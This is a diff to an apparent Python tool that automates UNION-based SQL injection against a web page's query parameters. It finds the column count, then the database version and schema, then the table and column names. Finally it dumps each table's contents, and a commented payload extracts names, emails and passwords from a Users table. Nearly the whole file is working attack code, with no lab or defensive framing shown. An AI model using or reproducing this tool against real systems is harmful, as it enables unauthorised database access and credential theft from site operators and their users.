@@ -12,6 +12,8 @@ from urllib.parse import urlparse
 import re
 from bs4 import BeautifulSoup
 
+
+
 def generate_union_select_marker_payload(number):
     buffer = ""
     base_payload = "' UNION SELECT "
@@ -45,7 +47,30 @@ def generate_union_select_null_payload(number):
     buffer += end_payload
     return (buffer)
     
-    
+def generate_union_payload(base_payload, end_payload, number, start_num):
+    buffer = None
+
+    if number < 1:
+        return None
+    buffer = base_payload
+    for i in range(start_num, number):
+        buffer += ", " + str(i)
+    buffer += end_payload
+    return buffer
+
+# payload = "' UNION SELECT GROUP_CONCAT(CONCAT_WS(':', 'Name', Name, ' Age', Age, ' Rank', Rank, ' Email', Email, ' Password', Password, '\n')),2 ,3 FROM Users -- -"
+
+def generate_union_columns_payload(base_payload, columns_tag ,number, end_payload):
+    buffer = None
+    if number < 1 or len(columns_tag) < 1:
+        return None
+    buffer = base_payload
+    for tag in columns_tag:
+        buffer += f", '{tag}', {tag}"
+    buffer += ", '\n'))"
+    return generate_union_payload(buffer, end_payload, number + 1, 2)
+
+
 def generate_marker_to_find(number):
         base = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
         chars = set()
@@ -74,7 +99,7 @@ def get_injection(vuln_links):
             
 
         except Exception as e:
-            print(f"{colored('ERROR INJECTION : ', RED, styles=UNDERLINE)}")
+            print(f"{colored('ERROR INJECTION : ', RED, styles=UNDERLINE)} {e}")
 
 
 def get_union_lines_response(response):
@@ -139,7 +164,7 @@ def get_union_based_injection(query_params, base_url):
         #! SEARCH FOR NUM OF COLUMNS
         columns = get_union_columns_size(query_params, base_url)
         print(f"columns find {colored(str(columns), GREEN, styles=BOLD)}")
-        if columns < 2:
+        if columns < 1:
             return None
        
         
@@ -163,9 +188,10 @@ def get_union_based_injection(query_params, base_url):
             else:
                 print(f"[{colored(element, GREEN)}]")
             
-        
-        #! 2 : FINDING TABLE NAME 
-        payload = "' UNION SELECT GROUP_CONCAT(table_name), 2, 3 FROM information_schema.tables WHERE table_schema=DATABASE()-- -"
+        #! 2 : FINDING VERSION AND SCHEMA  
+
+    
+        payload = generate_union_payload("' UNION SELECT CONCAT(@@version,0x3a,schema())", "-- -", columns, 1)
         params = query_params.copy() if isinstance(query_params, dict) else {}
         
         param_name = list(params.keys())[0] if params else query_params
@@ -176,20 +202,13 @@ def get_union_based_injection(query_params, base_url):
         lines_table = soup.find_all(string=True)
         
         print(f"{colored(payload, background=BG_RED)}")
-        for element in lines_table:            
-            if element == '\n': 
-                pass
-            else:
-                print(f"[{colored(element, YELLOW)}]")
                 
-                
-        #? COMPARING BASE_LINE
-        for base_line, tables_line in zip(base_lines, lines_table):
-            if base_line in marker_to_find and not tables_line.isdigit():
-                print(f"{colored(tables_line, background=BG_GREEN)}")            
+        for base_line, lines_table in zip(base_lines, lines_table):
+            if base_line in marker_to_find and not lines_table.isdigit():
+                print(f"{colored(lines_table, background=BG_GREEN)}") 
         
-        #! 3 : FINDING COLUMN_NAME
-        payload = "' UNION SELECT GROUP_CONCAT(column_name),2 , 3 FROM information_schema.columns WHERE table_name='Users'-- -"
+        #! 3 : FINDING TABLE NAME 
+        payload = generate_union_payload("' UNION SELECT GROUP_CONCAT(table_name)", " FROM information_schema.tables WHERE table_schema=DATABASE()-- -", columns, 1)
         params = query_params.copy() if isinstance(query_params, dict) else {}
         
         param_name = list(params.keys())[0] if params else query_params
@@ -197,19 +216,63 @@ def get_union_based_injection(query_params, base_url):
         response = requests.get(base_url, params=params)
         
         soup = BeautifulSoup(response.text, "html.parser")
-        lines_columns = soup.find_all(string=True)
+        lines_table = soup.find_all(string=True)
         
         print(f"{colored(payload, background=BG_RED)}")
-        for element in lines_columns:            
-                if element == '\n': 
-                    pass
-                else:
-                    print(f"[{colored(element, RED)}]")
+                
+        table_tags = []       
+        #? COMPARING BASE_LINE
+        for base_line, tables_line in zip(base_lines, lines_table):
+            if base_line in marker_to_find and not tables_line.isdigit():
+                if isinstance(tables_line, str):
+                    table_tags.extend(tables_line.split(','))
+        
+        #! 4 : FINDING COLUMN_NAME
+        for tag in table_tags:
+            print(f"{colored(tag, background=BG_MAGENTA)} ")            
+
+            payload = generate_union_payload("' UNION SELECT GROUP_CONCAT(column_name)", f" FROM information_schema.columns WHERE table_name='{tag}'-- -", columns, 1)
+
+            params = query_params.copy() if isinstance(query_params, dict) else {}
+        
+            param_name = list(params.keys())[0] if params else query_params
+            params[param_name] = payload
+            response = requests.get(base_url, params=params)
             
-        for base_line, line_columns in zip(base_lines, lines_columns):
-            if base_line in marker_to_find and not line_columns.isdigit():
-                print(f"{colored(line_columns, background=BG_GREEN)}") 
+            soup = BeautifulSoup(response.text, "html.parser")
+            lines_columns = soup.find_all(string=True)
             
-        print()
+            print(f"{colored(payload, background=BG_RED)}")
+            
+            columns_tag = []
+            for base_line, line_columns in zip(base_lines, lines_columns):
+                if base_line in marker_to_find and not line_columns.isdigit():
+                    if isinstance(line_columns, str):
+                        columns_tag.extend(line_columns.split(','))
+            
+            payload = generate_union_columns_payload("' UNION SELECT GROUP_CONCAT(CONCAT_WS(':'", columns_tag, columns,f" FROM {tag} -- -")
+            print(f"{colored(payload, background=BG_BLUE)}") 
+            
+            params = query_params.copy() if isinstance(query_params, dict) else {}
+        
+            param_name = list(params.keys())[0] if params else query_params
+            params[param_name] = payload
+            response = requests.get(base_url, params=params)
+            
+            soup = BeautifulSoup(response.text, "html.parser")
+            lines_columns = soup.find_all(string=True)
+            
+            print(f"{colored(payload, background=BG_RED)}")
+                
+            for base_line, line_columns in zip(base_lines, lines_columns):
+                if base_line in marker_to_find and not line_columns.isdigit():
+                    print(f"{colored(line_columns, background=BG_GREEN)}")
+            
+            print()
+            
+        #! 5 : DISPLAY ALL COLUMNS
+        # payload = "' UNION SELECT 1,GROUP_CONCAT(CONCAT_WS(':', 'Name', Name, ' Age', Age, ' Rank', Rank, ' Email', Email, ' Password', Password, '\n')),3 FROM Users -- -"
+        
+        # 
         
 
